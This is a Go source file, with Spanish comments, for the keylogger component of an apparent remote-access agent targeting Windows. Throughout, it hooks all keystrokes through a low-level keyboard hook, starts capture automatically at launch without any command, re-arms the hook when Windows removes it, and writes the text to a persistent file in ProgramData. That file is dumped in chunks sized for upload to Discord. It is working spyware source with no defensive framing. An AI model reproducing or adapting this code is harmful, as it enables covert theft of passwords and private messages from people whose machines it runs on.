//go:build windows

package win32

import (
	"errors"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"sync"
	"time"
	"unicode/utf16"
	"unicode/utf8"
	"unsafe"

	"github.com/local/govoid/internal/config"
	"golang.org/x/sys/windows"
)

const (
	whKeyboardLL  = 13
	wmKeyDown     = 0x0100
	wmSysKeyDown  = 0x0104
	wmQuit        = 0x0012
	hcAction      = 0
	cfUnicodeText = 13
)

const (
	// keylogMaxBytes es el tope del sumidero. Al pasarlo se rota a .1: un
	// keylog sin límite acaba llenando el disco de la máquina.
	keylogMaxBytes = 8 << 20

	// keylogFlushBytes y keylogFlushDelay deciden cuándo baja el texto a
	// disco. Antes cada tecla abría y escribía el archivo: una llamada al
	// sistema por pulsación dentro del callback del hook. Windows desinstala
	// un WH_KEYBOARD_LL que tarda más de 300 ms, así que ese diseño se caía
	// solo en cuanto el disco se ponía lento. Ahora el callback solo acumula
	// bytes y un escritor dedicado los vuelca en lote.
	keylogFlushBytes = 512
	keylogFlushDelay = 400 * time.Millisecond

	// keylogBatchWindow agrupa una ráfaga de tecleo en una sola escritura.
	keylogBatchWindow = 250 * time.Millisecond

	// keylogMaxPending acota lo acumulado si el disco no responde. Pasado el
	// tope se descartan teclas nuevas en vez de crecer sin freno.
	keylogMaxPending = 1 << 20

	// keylogDumpChunk limita un envío a Discord (8 MB por archivo de bot).
	keylogDumpChunk = 6 << 20
)

var (
	procSetWindowsHookExW   = user32.NewProc("SetWindowsHookExW")
	procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
	procCallNextHookEx      = user32.NewProc("CallNextHookEx")
	procGetMessageW         = user32.NewProc("GetMessageW")
	procTranslateMessage    = user32.NewProc("TranslateMessage")
	procDispatchMessageW    = user32.NewProc("DispatchMessageW")
	procPostThreadMessageW  = user32.NewProc("PostThreadMessageW")
	procGetKeyboardState    = user32.NewProc("GetKeyboardState")
	procToUnicode           = user32.NewProc("ToUnicode")
)

type point struct {
	X int32
	Y int32
}

type msg struct {
	Hwnd     uintptr
	Message  uint32
	WParam   uintptr
	LParam   uintptr
	Time     uint32
	Pt       point
	LPrivate uint32
}

type kbdllHookStruct struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

// Keylogger mantiene el hook WH_KEYBOARD_LL y vuelca lo tecleado a disco.
//
// El sumidero en disco es lo que hace que el registro sobreviva al reinicio del
// agente; el hook se instala solo al arrancar, así que no hay que encenderlo
// desde el panel.
type Keylogger struct {
	mu        sync.Mutex
	pending   []byte
	sink      *os.File
	hook      uintptr
	threadID  uint32
	lastFlush time.Time
	running   bool
	wanted    bool
	supervise bool
	writerOn  bool
	dropped   uint64
	writes    uint64
	done      chan struct{}
	wake      chan struct{}
	quit      chan struct{}
}

// Default es el keylogger que usa el agente.
var Default = &Keylogger{}

// hookProcRef mantiene viva la referencia del callback ante el GC.
var hookProcRef = windows.NewCallback(keyboardProc)

// keyboardProc corre en el hilo del message loop. No debe bloquear ni tocar el
// disco: solo acumula, y el escritor baja el lote.
func keyboardProc(nCode int32, wParam uintptr, lParam uintptr) uintptr {
	if nCode == hcAction && (wParam == wmKeyDown || wParam == wmSysKeyDown) {
		kb := (*kbdllHookStruct)(uintptrToPointer(lParam))
		Default.record(kb)
	}
	res, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
	return res
}

// record decodifica la tecla y la suma al lote pendiente. Sin asignaciones
// grandes, sin llamadas al sistema de archivos.
func (k *Keylogger) record(kb *kbdllHookStruct) {
	k.mu.Lock()
	if len(k.pending) >= keylogMaxPending {
		k.dropped++
		k.mu.Unlock()
		return
	}
	k.pending = appendKeyText(k.pending, kb)
	flush := len(k.pending) >= keylogFlushBytes || time.Since(k.lastFlush) >= keylogFlushDelay
	k.mu.Unlock()
	if flush {
		k.signal()
	}
}

// signal despierta al escritor sin bloquear al hook. El canal tiene hueco para
// una señal: varias teclas seguidas se agrupan en una sola llamada.
func (k *Keylogger) signal() {
	select {
	case k.wake <- struct{}{}:
	default:
	}
}

// appendKeyText traduce la tecla a UTF-8 sobre el buffer dado.
func appendKeyText(dst []byte, kb *kbdllHookStruct) []byte {
	switch kb.VkCode {
	case 0x0D:
		return append(dst, '\n')
	case 0x20:
		return append(dst, ' ')
	}

	if special, ok := specialKey(kb.VkCode); ok {
		return append(dst, special...)
	}

	var state [256]byte
	if res, _, _ := procGetKeyboardState.Call(uintptr(unsafe.Pointer(&state[0]))); res == 0 {
		return dst
	}

	var buf [8]uint16
	n, _, _ := procToUnicode.Call(
		uintptr(kb.VkCode),
		uintptr(kb.ScanCode),
		uintptr(unsafe.Pointer(&state[0])),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		0,
	)
	if int32(n) <= 0 {
		return dst
	}

	for i := 0; i < int(n); i++ {
		r := rune(buf[i])
		if utf16.IsSurrogate(r) && i+1 < int(n) {
			if pair := utf16.DecodeRune(r, rune(buf[i+1])); pair != utf8.RuneError {
				dst = utf8.AppendRune(dst, pair)
				i++
				continue
			}
		}
		dst = utf8.AppendRune(dst, r)
	}
	return dst
}

// specialKey devuelve la marca de las teclas que no producen texto.
func specialKey(vk uint32) (string, bool) {
	switch vk {
	case 0x08:
		return "[BKSP]", true
	case 0x09:
		return "[TAB]", true
	case 0x1B:
		return "[ESC]", true
	case 0x25:
		return "[LEFT]", true
	case 0x26:
		return "[UP]", true
	case 0x27:
		return "[RIGHT]", true
	case 0x28:
		return "[DOWN]", true
	case 0x2E:
		return "[DEL]", true
	case 0x24:
		return "[HOME]", true
	case 0x23:
		return "[END]", true
	case 0x21:
		return "[PGUP]", true
	case 0x22:
		return "[PGDN]", true
	}
	return "", false
}

// keylogSinkPath vive en ProgramData, junto al diario del agente: sobrevive a
// reinicios y a la reinstalación del binario.
func keylogSinkPath() string {
	return filepath.Join(config.StateDir(), "keylog.txt")
}

// keylogPosPath guarda hasta dónde se envió el último dump confirmado.
func keylogPosPath() string {
	return filepath.Join(config.StateDir(), "keylog.pos")
}

// writeLocked vuelca el lote pendiente. Si algo falla el lote se queda en
// memoria y se reintenta en el siguiente volcado: no se pierde nada.
func (k *Keylogger) writeLocked() {
	if len(k.pending) == 0 {
		return
	}

	path := keylogSinkPath()
	if k.sink == nil {
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			return
		}
		if info, err := os.Stat(path); err == nil && info.Size() >= keylogMaxBytes {
			_ = os.Rename(path, path+".1")
		}
		file, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o644)
		if err != nil {
			return
		}
		k.sink = file
	}

	if _, err := k.sink.Write(k.pending); err != nil {
		_ = k.sink.Close()
		k.sink = nil
		return
	}
	k.pending = k.pending[:0]
	k.writes++
}

// flush baja el lote a disco. Se llama desde el escritor y antes de un dump.
func (k *Keylogger) flush() {
	k.mu.Lock()
	k.writeLocked()
	dropped := k.dropped
	k.dropped = 0
	k.lastFlush = time.Now()
	k.mu.Unlock()

	if dropped > 0 {
		slog.Debug("keylogger: lote descartado por tope", "teclas", dropped)
	}
}

// startWriter lanza el escritor dedicado una sola vez.
func (k *Keylogger) startWriter() {
	k.mu.Lock()
	if k.writerOn {
		k.mu.Unlock()
		return
	}
	k.writerOn = true
	k.wake = make(chan struct{}, 1)
	k.quit = make(chan struct{})
	wake, quit := k.wake, k.quit
	k.mu.Unlock()

	go func() {
		for {
			select {
			case <-quit:
				k.flush()
				return
			case <-wake:
			}

			// Ventana de agrupación: lo tecleado en ráfaga entra en una sola
			// escritura en vez de una por pulsación.
			timer := time.NewTimer(keylogBatchWindow)
			select {
			case <-timer.C:
			case <-quit:
				timer.Stop()
				k.flush()
				return
			}
			k.flush()
		}
	}()
}

// Start instala el hook en un hilo propio con su message loop.
func (k *Keylogger) Start() error {
	k.mu.Lock()
	if k.running {
		k.wanted = true
		k.mu.Unlock()
		return nil
	}
	k.wanted = true
	k.mu.Unlock()

	k.startWriter()
	k.superviseLoop()
	return k.install()
}

// AutoStart enciende la captura en el arranque del proceso, sin esperar ningún
// comando: el hook queda montado antes de instalar la persistencia o conectar
// el bot. Un stop del panel dura lo que dure este proceso; el siguiente
// arranque vuelve a capturar, que es lo que se espera de un agente desplegado.
func (k *Keylogger) AutoStart() {
	k.mu.Lock()
	k.wanted = true
	k.mu.Unlock()

	k.startWriter()
	k.superviseLoop()

	if err := k.install(); err != nil {
		slog.Debug("keylogger: no se pudo instalar al arrancar, se reintenta", "err", err)
		return
	}
	slog.Info("keylogger: captura activa desde el arranque", "sumidero", keylogSinkPath())
}

// install monta el hook y corre el message loop hasta que alguien pide parar.
func (k *Keylogger) install() error {
	ready := make(chan error, 1)

	go func() {
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		hook, _, callErr := procSetWindowsHookExW.Call(whKeyboardLL, hookProcRef, 0, 0)
		if hook == 0 {
			ready <- fmt.Errorf("keylogger: SetWindowsHookExW falló: %v", callErr)
			return
		}

		done := make(chan struct{})
		k.mu.Lock()
		k.hook = hook
		k.threadID = windows.GetCurrentThreadId()
		k.running = true
		k.done = done
		wanted := k.wanted
		k.mu.Unlock()

		ready <- nil

		// Un stop que llegó mientras se montaba el hook no puede quedar en
		// nada: se cierra el bucle recién abierto.
		if !wanted {
			procPostThreadMessageW.Call(uintptr(windows.GetCurrentThreadId()), wmQuit, 0, 0)
		}

		var m msg
		for {
			res, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&m)), 0, 0, 0)
			if int32(res) <= 0 {
				break
			}
			procTranslateMessage.Call(uintptr(unsafe.Pointer(&m)))
			procDispatchMessageW.Call(uintptr(unsafe.Pointer(&m)))
		}

		procUnhookWindowsHookEx.Call(hook)
		k.mu.Lock()
		k.running = false
		k.hook = 0
		k.threadID = 0
		k.mu.Unlock()
		close(done)
	}()

	return <-ready
}

// superviseLoop vigila el hook. Windows puede retirarlo si otro hook de la
// cadena se atasca; sin esto la captura se quedaba muerta hasta el próximo
// arranque del agente.
func (k *Keylogger) superviseLoop() {
	k.mu.Lock()
	if k.supervise {
		k.mu.Unlock()
		return
	}
	k.supervise = true
	k.mu.Unlock()

	go func() {
		ticker := time.NewTicker(3 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			k.mu.Lock()
			wanted, running := k.wanted, k.running
			k.mu.Unlock()
			if !wanted || running {
				continue
			}
			if err := k.install(); err != nil {
				slog.Debug("keylogger: rearme fallido", "err", err)
			}
		}
	}()
}

// Stop desinstala el hook en este proceso. El próximo arranque del agente
// vuelve a montarlo: la captura no depende de que nadie la encienda.
func (k *Keylogger) Stop() {
	k.mu.Lock()
	k.wanted = false
	running, tid, done := k.running, k.threadID, k.done
	k.mu.Unlock()

	if running && done != nil {
		procPostThreadMessageW.Call(uintptr(tid), wmQuit, 0, 0)
		select {
		case <-done:
		case <-time.After(2 * time.Second):
			slog.Debug("keylogger: el message loop no cerró a tiempo")
		}
	}
	k.flush()
}

// Running informa si el hook está activo.
func (k *Keylogger) Running() bool {
	k.mu.Lock()
	defer k.mu.Unlock()
	return k.running
}

// Dump devuelve lo capturado desde el último envío confirmado y el
// desplazamiento con el que hay que llamar a Commit cuando el archivo salga.
// Con -1 no se confirma nada: el texto se quedó en memoria y hay que reintentar.
func (k *Keylogger) Dump() (string, int64) {
	k.flush()

	k.mu.Lock()
	pending := append([]byte(nil), k.pending...)
	k.mu.Unlock()

	raw, err := os.ReadFile(keylogSinkPath())
	if err != nil {
		if len(pending) == 0 {
			return "", -1
		}
		return string(pending), -1
	}

	offset := readKeylogOffset()
	if offset < 0 || offset > int64(len(raw)) {
		offset = 0
	}
	chunk := raw[offset:]
	if len(chunk) > keylogDumpChunk {
		chunk = chunk[:keylogDumpChunk]
	}
	if len(chunk) == 0 && len(pending) == 0 {
		return "", offset
	}
	if len(pending) > 0 {
		return string(chunk) + string(pending), -1
	}
	return string(chunk), offset + int64(len(chunk))
}

// Commit marca como enviado lo que salió en el dump.
func (k *Keylogger) Commit(offset int64) {
	if offset < 0 {
		return
	}
	path := keylogPosPath()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return
	}
	if err := os.WriteFile(path, []byte(strconv.FormatInt(offset, 10)), 0o644); err != nil {
		slog.Debug("keylogger: no se pudo guardar el puntero del dump", "err", err)
	}
}

func readKeylogOffset() int64 {
	raw, err := os.ReadFile(keylogPosPath())
	if err != nil {
		return 0
	}
	offset, err := strconv.ParseInt(string(trimSpaceBytes(raw)), 10, 64)
	if err != nil || offset < 0 {
		return 0
	}
	return offset
}

func trimSpaceBytes(raw []byte) []byte {
	start, end := 0, len(raw)
	for start < end && (raw[start] == ' ' || raw[start] == '\n' || raw[start] == '\r' || raw[start] == '\t') {
		start++
	}
	for end > start && (raw[end-1] == ' ' || raw[end-1] == '\n' || raw[end-1] == '\r' || raw[end-1] == '\t') {
		end--
	}
	return raw[start:end]
}

// Close suelta el sumidero tras volcar lo pendiente. Sin esto el archivo queda
// abierto hasta que el proceso muere.
func (k *Keylogger) Close() {
	k.flush()
	k.mu.Lock()
	if k.sink != nil {
		_ = k.sink.Close()
		k.sink = nil
	}
	k.mu.Unlock()
}

// ErrNotRunning se devuelve cuando se pide parar un keylogger inactivo.
var ErrNotRunning = errors.New("keylogger: no está corriendo")
